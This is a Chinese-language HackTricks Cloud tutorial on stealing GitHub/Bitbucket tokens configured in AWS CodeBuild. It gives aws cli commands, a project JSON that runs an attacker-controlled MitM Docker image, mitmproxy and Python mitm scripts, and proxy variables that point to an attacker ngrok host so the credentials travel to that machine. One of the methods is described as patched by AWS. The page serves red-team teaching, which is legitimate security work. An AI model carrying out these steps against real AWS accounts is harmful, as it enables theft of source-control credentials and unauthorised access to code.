# AWS Codebuild - 令牌泄露

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 恢复Github/Bitbucket配置的令牌

首先，检查是否配置了您可能泄露的源凭证：
```bash
aws codebuild list-source-credentials
```
### 通过 Docker 镜像

如果您发现例如 Github 的认证设置在账户中，您可以通过让 Codebuild **使用特定的 Docker 镜像** 来运行项目的构建，来**窃取**那些**访问**（**GH 令牌或 OAuth 令牌**）。

为此，您可以**创建一个新的 Codebuild 项目**或更改现有项目的**环境**，以设置**Docker 镜像**。

您可以使用的 Docker 镜像是 [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)。这是一个非常基础的 Docker 镜像，它将设置**环境变量 `https_proxy`**、**`http_proxy`** 和 **`SSL_CERT_FILE`**。这将允许您拦截在 **`https_proxy`** 和 **`http_proxy`** 中指示的主机的大部分流量，并信任在 **`SSL_CERT_FILE`** 中指示的 SSL 证书。

1. **创建并上传您自己的 Docker MitM 镜像**
* 按照仓库的说明设置您的代理 IP 地址和 SSL 证书，并**构建 Docker 镜像**。
* **不要设置 `http_proxy`**，以免拦截对元数据端点的请求。
* 您可以使用 **`ngrok`**，比如 `ngrok tcp 4444` 来设置代理到您的主机
* 一旦您构建了 Docker 镜像，**上传它到一个公共仓库**（Dockerhub、ECR...）
2. **设置环境**
* 创建一个**新的 Codebuild 项目**或**修改**现有项目的环境。
* 将项目设置为使用**之前生成的 Docker 镜像**

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

3. **在您的主机中设置 MitM 代理**

* 如**Github 仓库**中所示，您可以使用类似的东西：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**使用的 mitmproxy 版本是 9.0.1**，有报告称版本 10 可能无法工作。
{% endhint %}

4. **运行构建并捕获凭证**

*   你可以在 **Authorization** 头中看到令牌：

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

这也可以通过 aws cli 来完成，类似于

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~通过 HTTP 协议~~

{% hint style="success" %}
**这个漏洞在 2023 年 2 月 20 日那周的某个时候被 AWS 修复了（我认为是在周五）。所以攻击者现在不能再滥用它了 :)**
{% endhint %}

攻击者拥有 **在 CodeBuild 上的提升权限可以泄露配置的 Github/Bitbucket 令牌**，或者如果权限是通过 OAuth 配置的，那么可以泄露用于访问代码的**临时 OAuth 令牌**。

* 攻击者可以向 CodeBuild 项目添加环境变量 **http\_proxy** 和 **https\_proxy**，指向他的机器（例如 `http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 然后，将 github 仓库的 URL 从 HTTPS 改为 HTTP，例如：**http://**github.com/carlospolop-forks/TestActions
* 接着，在代理变量（http\_proxy 和 https\_proxy）指向的端口上运行 [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) 中的基本示例
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最后，点击 **构建项目**，**凭证**将以明文（base64）形式发送到mitm端口：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
现在，攻击者将能够从他的机器上使用该令牌，列出它拥有的所有权限，并且比直接使用CodeBuild服务更容易（滥）用。
{% endhint %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
